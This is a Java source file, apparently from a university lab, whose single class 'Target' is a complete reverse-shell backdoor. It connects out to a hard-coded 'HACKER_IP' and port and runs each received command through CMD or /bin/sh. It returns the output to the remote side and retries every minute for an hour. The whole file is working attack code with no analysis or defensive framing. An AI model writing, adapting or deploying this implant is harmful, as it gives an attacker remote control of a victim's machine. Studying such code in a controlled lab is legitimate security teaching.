package edu.tu;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.Socket;
import java.net.UnknownHostException;

public class Target {

	// Hacker service
	private static final String HACKER_IP = "192.168.138.130";	// change this to the host ip
	private static final int    HACKER_PORT = 23532;
	
	
	private Socket socket = null;
	private DataOutputStream streamOut = null;
	private DataInputStream streamIn = null;
	private boolean bWindows = true;
	private boolean bDebug = false;
	
	
	private void execute( String serverName, int serverPort ) throws UnknownHostException, IOException {
		
		String osname = System.getProperty("os.name").toLowerCase();
		if ( ! osname.contains("win") ){
			bWindows = false;
		}
		
		socket = new Socket(serverName, serverPort);
		if ( bDebug )
			System.out.println("Connected: " + socket);
		
		start();
					
		while (true) {
			try {
				String cmd = streamIn.readUTF();
				if ( cmd.equals("exit") )
					break;
				
				streamOut.writeUTF( execute( cmd ) );
				streamOut.flush();
								
			} catch (IOException ioe) {
				break;
			}
		}
		
		stop();
	}

	
	private String execute(String cmd) {
		String result = "";

		try {
			ProcessBuilder pb = null; //creates program that will execute
			
			// for windows 
			if ( bWindows ){
				pb = new ProcessBuilder( "CMD", "/C", cmd );//creates command and runs in command shell -c in background
			} else {
				// linux
				pb = new ProcessBuilder( "/bin/sh", "-c", cmd ); //bash shell for linux
			}
			
			final Process process = pb.start(); //starts program
			
			BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream())); //input
			String line;
			while ((line = br.readLine()) != null) {
				result += line + "\n";
			}
			
			BufferedReader be = new BufferedReader(new InputStreamReader(process.getErrorStream())); //output
			while ((line = be.readLine()) != null) {
				result += line + "\n";
			}
	 
		} catch (Exception ex) {
			result = ex.getMessage();
		}

		return result; //returns result
	}	
	
	
	public void start() throws IOException {
		streamOut = new DataOutputStream(socket.getOutputStream());
		streamIn = new DataInputStream(new BufferedInputStream(socket.getInputStream()));
	}

	
	public void stop() throws IOException {
		if (streamOut != null)
			streamOut.close();
		if (streamIn != null)
			streamIn.close();
		if (socket != null)
			socket.close();
	}

	public static void main(String args[]) {
		
		// try to contact hacker every minute 
		for( int index = 0; index < 60 ; ++index ){
			
			Target victim = new Target();
			
			try {
				
				victim.execute( HACKER_IP, HACKER_PORT );
				
			} catch (IOException e) {
			} catch (Exception ex ) {
				if ( victim.bDebug )
					ex.printStackTrace();
			}
			
			// wait a minute
			if ( victim.bDebug )
				System.out.println( "(" + index + ") Waiting for hacker... ");
			
			try {
				Thread.sleep( 60000 );
			} catch (InterruptedException e1) {
			}

		}
		
	}
}
